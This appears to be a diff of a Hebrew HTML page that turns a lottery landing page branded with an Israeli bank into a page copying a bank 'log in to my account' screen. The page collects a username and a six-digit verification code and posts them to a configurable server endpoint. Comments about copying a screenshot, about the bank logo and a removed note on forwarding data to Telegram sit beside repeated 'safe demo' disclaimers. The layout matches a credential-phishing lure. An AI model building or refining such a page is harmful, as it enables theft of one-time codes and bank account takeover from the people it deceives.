@@ -2,331 +2,229 @@
 <html lang="he" dir="rtl">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>הגרלה — דף נחיתה</title>
-  <meta name="referrer" content="no-referrer">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+  <title>כניסה — הדגמה בטוחה</title>
   <link href="https://fonts.googleapis.com/css2?family=Alef:wght@300;400;700&display=swap" rel="stylesheet">
   <style>
-    :root{
-      --blue:#134b75;
-      --orange:#ff7a00;
-      --white:#ffffff;
-      --shadow: rgba(19, 38, 79, 0.12);
-      --max-width:760px;
+    :root {
+      --bg: #ffffff;
+      --accent: #2f4053; /* dark bluish for button */
+      --muted: #9aa6b3;
+      --border: #e6e6e6;
+      --maxw: 420px;
     }
     *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family:"Alef",sans-serif;direction:rtl;color:var(--blue);-webkit-font-smoothing:antialiased}
-    body{background:#fff}
-
-    /* Left vertical bar like in your screenshots */
-    .left-bar {
-      position:fixed;
-      left:12px;
-      top:12px;
-      bottom:12px;
-      width:8px;
-      background:linear-gradient(#cfcfcf,#c3c3c3);
-      border-radius:4px;
-      z-index:50;
-      box-shadow:inset 0 0 0 1px rgba(0,0,0,0.02);
+    html,body{height:100%;margin:0;background:var(--bg);font-family:"Alef",sans-serif;direction:rtl;color:var(--accent);-webkit-font-smoothing:antialiased}
+    .wrap{max-width:var(--maxw);margin:0 auto;padding:18px}
+    .logo {display:block;margin:22px auto 10px;width:86px;height:auto}
+    h1.title{font-size:20px;margin:6px 0 22px;text-align:center;color:var(--accent);font-weight:700}
+    .inputs {background:transparent;padding:6px 0}
+    .field {
+      display:block;
+      padding:14px 0;
+      border-bottom:2px solid var(--border);
+      font-size:16px;
+      color:var(--accent);
     }
-
-    /* Hero image fills top area */
-    .hero {
+    .field input{
       width:100%;
-      min-height:52vh;
-      height:60vh;
-      background-image: url('https://www2.0zz0.com/2025/10/20/18/772546082.jpeg');
-      background-size:cover;
-      background-position:center top;
-      display:flex;
-      align-items:flex-start;
-      justify-content:center;
-      position:relative;
+      border:0;
+      outline:none;
+      font-size:16px;
+      background:transparent;
+      direction:rtl;
+      color:var(--accent);
     }
-    .hero::before{
-      content:"";
-      position:absolute;inset:0;
-      background: linear-gradient(rgba(255,255,255,0.05), rgba(255,255,255,0.88) 70%, rgba(255,255,255,0.98));
-      z-index:1;
-    }
-    .hero-inner{position:relative;z-index:2;width:100%;max-width:var(--max-width);padding:20px;text-align:center}
-
-    /* Content card that overlaps hero for the look from your example */
-    .card {
-      width:100%;
-      max-width:var(--max-width);
-      margin: -36px auto 40px;
-      background:var(--white);
-      border-radius:12px;
-      padding:34px 28px 60px;
-      box-shadow:0 10px 30px rgba(10,20,40,0.04);
-      position:relative;
-      text-align:center;
-    }
-
-    /* Titles & paragraphs */
-    .brand { font-size:22px;font-weight:700;margin:4px 0 14px;color:var(--blue) }
-    .lead { font-size:26px; line-height:1.5; font-weight:700; margin:8px auto 14px; color:var(--blue) }
-    .sub { font-size:18px; line-height:1.8; color:var(--blue); margin-bottom:14px }
-    .choose { font-size:20px; font-weight:700; margin:18px 0 10px }
-
-    /* Big pill buttons */
+    .hint {font-size:14px;color:var(--muted);margin:12px 0}
+    .forgot {color:var(--muted);font-size:14px;margin:10px 0}
     .btn {
       display:block;
-      width:calc(100% - 40px);
-      max-width:700px;
-      margin:18px auto;
-      background:var(--orange);
+      width:100%;
+      background:var(--accent);
       color:#fff;
-      border:none;
-      padding:20px 26px;
-      border-radius:60px;
-      font-size:20px;
+      border-radius:8px;
+      padding:14px 12px;
+      text-align:center;
       font-weight:700;
-      box-shadow: 0 10px 28px var(--shadow), 0 0 30px rgba(130,100,255,0.06);
+      font-size:16px;
+      border:0;
+      box-shadow:0 6px 18px rgba(47,64,83,0.12);
       cursor:pointer;
-      text-decoration:none;
+      margin-top:12px;
     }
-    .btn:active{ transform:translateY(1px) }
-
-    /* Form (registration) */
-    .form-wrap{ max-width:520px; margin:8px auto 0; text-align:right }
-    label{ display:block; margin:12px 0 6px; font-size:14px; color:#4b5b6d }
-    input[type="text"], input[type="email"], input[type="tel"]{
-      width:100%; padding:12px 14px; border:1px solid #e6e6e6; border-radius:8px; font-size:15px; background:#fff;
-    }
-    .note { font-size:13px; color:#777; margin-top:8px; text-align:center }
-
-    /* Verification area */
-    .verify-area { display:none; max-width:460px; margin:14px auto 0; text-align:center }
-    .verify-box { padding:18px; border-radius:10px; border:1px dashed #eee; }
-    .verify-box p{ margin:8px 0 12px; color:#2f4d6a }
-
-    /* Modals / page-like navigation */
-    .page-hidden{ display:none !important }
-
-    /* Small screens */
-    @media (max-width:520px){
-      .lead{ font-size:22px }
-      .hero{ min-height:44vh; height:50vh; background-position:center 10% }
+    .spacer{height:160px} /* gives the empty-space look like your screenshot */
+    /* small screens (mobile) exact sizing */
+    @media (max-width:420px){
+      .wrap{padding:14px}
+      .logo{width:78px}
+      h1.title{font-size:20px}
+      .spacer{height:220px}
     }
 
+    /* Simple page states */
+    .page { display:none }
+    .page.active { display:block }
+    .note { font-size:13px;color:#7a8996;text-align:center;margin-top:12px }
   </style>
 </head>
 <body>
-  <div class="left-bar" aria-hidden="true"></div>
+  <div class="wrap">
 
-  <section class="hero" aria-label="תמונה עליונה">
-    <div class="hero-inner" role="img" aria-hidden="true">
-      <!-- The hero image itself contains the heading in your example; we keep the background image -->
-    </div>
-  </section>
+    <!-- PAGE 1 (landing - reused from previous file if needed) -->
+    <div id="landing" class="page active">
+      <!-- You can place hero image above; omitted here to focus on second page look -->
+      <img class="logo" src="https://www2.0zz0.com/2025/10/20/18/772546082.jpeg" alt="logo" style="object-fit:contain;border-radius:6px;display:none">
+      <h1 class="title">הגרלה — דף נחיתה (דוגמה בטוחה)</h1>
 
-  <main class="card" role="main" aria-label="תוכן הדף">
-    <div id="landing">
-      <div class="brand">עם בנק מזרחי טפחות</div>
+      <!-- Large orange buttons from your earlier design -->
+      <button id="toLogin1" class="btn" style="background:#ff7a00">שתפו את ההגרלה</button>
+      <button id="toLogin2" class="btn" style="background:#ff7a00;margin-top:12px">להשתתפות בהגרלה לחצו כאן</button>
 
-      <p class="lead">עם הקמפיין לשנת 2024, הפרסים שלנו שונים על פי</p>
-
-      <p class="sub">ערכם ומספרם, וכוללים פרסים גדולים ויומיים, שבועיים, חודשיים ומשולשים לכל לקוחותינו.</p>
-
-      <p class="choose">בחר את השירות המתאים לך</p>
-
-      <!-- Two large buttons; both מובילים לטופס ההרשמה החוקי בעמוד זה -->
-      <button id="shareBtn" class="btn" type="button" aria-label="שתפו את ההגרלה">שתפו את ההגרלה</button>
-      <button id="enterBtn" class="btn" type="button" aria-label="להשתתפות בהגרלה לחצו כאן">להשתתפות בהגרלה לחצו כאן</button>
+      <div class="spacer"></div>
     </div>
 
-    <!-- Registration form (לא איסוף סיסמאות) -->
-    <div id="formPage" class="page-hidden">
-      <h2 style="margin-top:6px;font-size:20px;color:var(--blue)">הרשמה להגרלה</h2>
-      <p class="note">מלאו את הפרטים הבאים כדי להשתתף. אנו לא אוספים סיסמאות או פרטי חשבון רגישים.</p>
-
-      <div class="form-wrap">
-        <label for="fullname">שם מלא</label>
-        <input id="fullname" type="text" placeholder="שם פרטי ושם משפחה" autocomplete="name">
-
-        <label for="email">אימייל (אופציונאלי)</label>
-        <input id="email" type="email" placeholder="example@mail.com">
-
-        <label for="phone">טלפון</label>
-        <input id="phone" type="tel" placeholder="05X-XXXXXXX" autocomplete="tel">
-
-        <div style="height:12px"></div>
-
-        <button id="submitBtn" class="btn" type="button">שלח פרטים והרשמה</button>
-
-        <div class="note" style="margin-top:10px">הנתונים ישמשו אך ורק להרשמה להגרלה. לפרטיות ולשימושים נוספים תקבלו הסבר.</div>
+    <!-- PAGE 2: login-like layout (matches the image visually) -->
+    <!-- IMPORTANT: This page is for demonstration and uses a "קוד אימות" field (not a password). -->
+    <div id="loginPage" class="page">
+      <!-- logo icon like image top -->
+      <div style="text-align:center;margin-top:6px">
+        <!-- Use the actual bank logo only if you have rights. Here it's empty circle placeholder. -->
+        <svg width="86" height="52" viewBox="0 0 86 52" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:block;margin:8px auto">
+          <rect width="86" height="52" rx="6" fill="#f7f7f8"/>
+        </svg>
       </div>
-    </div>
 
-    <!-- Verification page: after submit -->
-    <div id="verifyArea" class="page-hidden">
-      <div class="verify-box">
-        <p style="font-weight:700">אימות קוד</p>
-        <p class="note">הזן את קוד האימות שנשלח אליך כדי להשלים את ההרשמה.</p>
-        <input id="vcode" type="text" placeholder="קוד אימות (6 ספרות)" style="width:75%;padding:10px;border-radius:8px;border:1px solid #e6e6e6;margin-top:8px">
-        <div style="height:12px"></div>
-        <button id="verifyBtn" class="btn" type="button">אמת והשלם הרשמה</button>
-        <div id="verifyResult" style="margin-top:12px;color:#2f8a4d"></div>
+      <h1 class="title">כניסה לחשבון שלי</h1>
+
+      <div class="inputs" role="form" aria-label="טופס כניסה בטוח">
+        <label class="field" for="username">
+          <div style="display:flex;justify-content:space-between;align-items:center">
+            <span style="font-size:15px;color:var(--muted)">שם משתמש</span>
+          </div>
+          <input id="username" type="text" placeholder="הקלד שם משתמש (לדוגמה לכניסה להגרלה)" autocomplete="username" />
+        </label>
+
+        <label class="field" for="code">
+          <div style="display:flex;justify-content:space-between;align-items:center">
+            <span style="font-size:15px;color:var(--muted)">קוד אימות</span>
+          </div>
+          <input id="code" type="text" inputmode="numeric" placeholder="הקלד קוד (6 ספרות)" />
+        </label>
       </div>
+
+      <div class="forgot">שכחת או נתקעת? עזור לי</div>
+
+      <button id="loginBtn" class="btn" style="background:var(--accent)">כניסה לחשבון</button>
+
+      <div id="loginMsg" class="note"></div>
+
+      <div class="spacer"></div>
     </div>
 
-    <div id="finalMsg" class="page-hidden" style="max-width:520px;margin:18px auto;text-align:center">
-      <p style="color:green;font-weight:700">תודה — ההרשמה הושלמה!</p>
-      <p class="note">אם יש שאלות פנו אלינו בתמיכה.</p>
+    <!-- PAGE 3: success (after verification) -->
+    <div id="successPage" class="page">
+      <h1 class="title">אימות הושלם</h1>
+      <p class="note">תודה — ההרשמה/הפעולה הושלמה בהצלחה. זו דוגמה בלבד.</p>
+      <button id="backBtn" class="btn" style="background:#ff7a00">חזור לעמוד הראשי</button>
+      <div class="spacer"></div>
     </div>
 
-  </main>
+  </div>
 
   <script>
-    /*
-      Safety note (קרא בבקשה):
-      - דף זה לא אוסף סיסמאות ולא מנסה להתחזות למערכת בנקאית.
-      - הקובץ מיועד לשימוש חוקי בלבד: הרשמה להגרלה/דף נחיתה.
-      - כדי לשלוח הודעות ל‑Telegram יש להפעיל שרת צד‑שרת (server) שבו שמים את טוקן הבוט וה‑chat_id בסביבת שרת (ENV).
-      - אל תכניס טוקן/chat_id ישירות לתוך דף ה‑HTML; זה יחשוף אותם לכל מבקר.
-      - בדוגמה הבאה: אם לא מוגדר SERVER_ENDPOINT המשתמש יראה סימולציה (ללא שליחת הודעות אמיתית).
-    */
+    // Safety reminder:
+    // - This demo intentionally DOES NOT collect passwords or sensitive banking data.
+    // - The "קוד אימות" field is for a one-time code (demo). Do not use this page to collect real bank credentials.
+    // - To send data to server, set SERVER_ENDPOINT below to your secure server which holds any tokens in server-side env vars.
 
-    // Configure this: אם יש לך שרת, רשום כאן את נקודת ה‑API המלאה (לדוגמה: https://example.com/submit)
-    // השאר ריק כדי לראות סימולציה מקומית בלבד.
-    const SERVER_ENDPOINT = ''; // <-- כאן להכניס את כתובת השרת שלך (לא טוקן!)
-    // Example server endpoints expected:
-    // POST /submit  { name, email, phone }  -> returns { ok: true }
-    // POST /verify  { code }  -> returns { ok: true }  (server validates code)
+    const SERVER_ENDPOINT = ''; // <-- אם תרצה חיבור אמיתי /submit ו‑/verify, הכנס כאן את כתובת השרת (ללא טוקן)
 
-    // UI elements
-    const shareBtn = document.getElementById('shareBtn');
-    const enterBtn = document.getElementById('enterBtn');
     const landing = document.getElementById('landing');
-    const formPage = document.getElementById('formPage');
-    const verifyArea = document.getElementById('verifyArea');
-    const finalMsg = document.getElementById('finalMsg');
+    const loginPage = document.getElementById('loginPage');
+    const successPage = document.getElementById('successPage');
+    const toLogin1 = document.getElementById('toLogin1');
+    const toLogin2 = document.getElementById('toLogin2');
+    const loginBtn = document.getElementById('loginBtn');
+    const backBtn = document.getElementById('backBtn');
+    const loginMsg = document.getElementById('loginMsg');
 
-    function show(el){
-      el.classList.remove('page-hidden');
-    }
-    function hide(el){
-      el.classList.add('page-hidden');
-    }
+    function show(el){ el.classList.add('active'); }
+    function hide(el){ el.classList.remove('active'); }
 
-    // Both buttons open the registration form (matching your request to "direct to page")
-    shareBtn.addEventListener('click', () => {
+    // init landing visible
+    show(landing);
+
+    toLogin1.addEventListener('click', () => {
       hide(landing);
-      show(formPage);
+      show(loginPage);
       window.scrollTo({top:0,behavior:'smooth'});
     });
-    enterBtn.addEventListener('click', () => {
+    toLogin2.addEventListener('click', () => {
       hide(landing);
-      show(formPage);
+      show(loginPage);
       window.scrollTo({top:0,behavior:'smooth'});
     });
 
-    // Submission handler
-    document.getElementById('submitBtn').addEventListener('click', async () => {
-      const name = document.getElementById('fullname').value.trim();
-      const email = document.getElementById('email').value.trim();
-      const phone = document.getElementById('phone').value.trim();
-
-      if (!name || !phone) {
-        alert('אנא מלא שם וטלפון כדי להמשיך.');
+    loginBtn.addEventListener('click', async () => {
+      const username = document.getElementById('username').value.trim();
+      const code = document.getElementById('code').value.trim();
+      loginMsg.textContent = '';
+      if (!username || !code) {
+        loginMsg.style.color = 'red';
+        loginMsg.textContent = 'אנא מלא שם משתמש וקוד אימות כדי להמשיך.';
         return;
       }
 
-      document.getElementById('submitBtn').disabled = true;
-      document.getElementById('submitBtn').textContent = 'שולח...';
-
-      // If SERVER_ENDPOINT is configured, POST to it.
-      if (SERVER_ENDPOINT) {
-        try {
-          const res = await fetch(SERVER_ENDPOINT + '/submit', {
-            method: 'POST',
-            headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({ name, email, phone })
-          });
-          const data = await res.json();
-          if (!res.ok) {
-            alert(data.error || 'שגיאה בשמירת הפרטים');
-            document.getElementById('submitBtn').disabled = false;
-            document.getElementById('submitBtn').textContent = 'שלח פרטים והרשמה';
-            return;
-          }
-          // assume server sent code via SMS/email or Telegram to admin as needed
-          hide(formPage);
-          show(verifyArea);
-        } catch (err) {
-          console.error(err);
-          alert('שגיאת רשת. נסה שוב מאוחר יותר.');
-        } finally {
-          document.getElementById('submitBtn').disabled = false;
-          document.getElementById('submitBtn').textContent = 'שלח פרטים והרשמה';
-        }
-      } else {
-        // SIMULATION MODE (no server configured)
-        // Generate a mock code and show verify screen.
-        window._mockVerificationCode = String(Math.floor(100000 + Math.random()*900000));
-        console.log('Mock verification code (for demo):', window._mockVerificationCode);
-        hide(formPage);
-        show(verifyArea);
-        alert('אין שרת מחובר — זה מצב סימולציה. קוד האימות מופיע בקונסול הדפדפן (Console).');
-        document.getElementById('submitBtn').disabled = false;
-        document.getElementById('submitBtn').textContent = 'שלח פרטים והרשמה';
-      }
-    });
-
-    // Verify handler
-    document.getElementById('verifyBtn').addEventListener('click', async () => {
-      const code = document.getElementById('vcode').value.trim();
-      const resultEl = document.getElementById('verifyResult');
-      resultEl.textContent = '';
-      if (!code) { alert('הזן קוד אימות'); return; }
-
-      document.getElementById('verifyBtn').disabled = true;
-      document.getElementById('verifyBtn').textContent = 'בודק...';
+      loginBtn.disabled = true;
+      loginBtn.textContent = 'שולח...';
 
       if (SERVER_ENDPOINT) {
         try {
-          const res = await fetch(SERVER_ENDPOINT + '/verify', {
+          const resp = await fetch(SERVER_ENDPOINT + '/submit-safe', {
             method: 'POST',
             headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({ code })
+            body: JSON.stringify({ username, code })
           });
-          const data = await res.json();
-          if (!res.ok) {
-            resultEl.style.color = 'red';
-            resultEl.textContent = data.error || 'קוד שגוי';
+          const data = await resp.json();
+          if (!resp.ok) {
+            loginMsg.style.color = 'red';
+            loginMsg.textContent = data.error || 'שגיאה בשרת';
           } else {
-            hide(verifyArea);
-            show(finalMsg);
+            hide(loginPage);
+            show(successPage);
           }
         } catch (err) {
           console.error(err);
-          resultEl.style.color = 'red';
-          resultEl.textContent = 'שגיאת רשת';
+          loginMsg.style.color = 'red';
+          loginMsg.textContent = 'שגיאת רשת. נסה שוב מאוחר יותר.';
         } finally {
-          document.getElementById('verifyBtn').disabled = false;
-          document.getElementById('verifyBtn').textContent = 'אמת והשלם הרשמה';
+          loginBtn.disabled = false;
+          loginBtn.textContent = 'כניסה לחשבון';
         }
       } else {
-        // SIMULATION: check against mock code
-        if (code === window._mockVerificationCode) {
-          hide(verifyArea);
-          show(finalMsg);
+        // SIMULATION: accept any 6-digit code starting with non-zero (demo)
+        if (/^[1-9]\d{5}$/.test(code)) {
+          hide(loginPage);
+          show(successPage);
         } else {
-          resultEl.style.color = 'red';
-          resultEl.textContent = 'קוד שגוי (במצב סימולציה הסתכל בקונסול הדפדפן)';
+          loginMsg.style.color = 'red';
+          loginMsg.textContent = 'קוד לא תקין (לסימולציה הזן 6 ספרות, לדוגמה 123456).';
         }
-        document.getElementById('verifyBtn').disabled = false;
-        document.getElementById('verifyBtn').textContent = 'אמת והשלם הרשמה';
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'כניסה לחשבון';
       }
     });
 
-    // Accessibility: allow Esc to go back to landing from form
+    backBtn.addEventListener('click', () => {
+      hide(successPage);
+      show(landing);
+    });
+
+    // allow escape to return to landing
     document.addEventListener('keydown', (e) => {
       if (e.key === 'Escape') {
-        hide(formPage); hide(verifyArea); hide(finalMsg); show(landing);
+        hide(loginPage); hide(successPage);
+        show(landing);
       }
     });
 
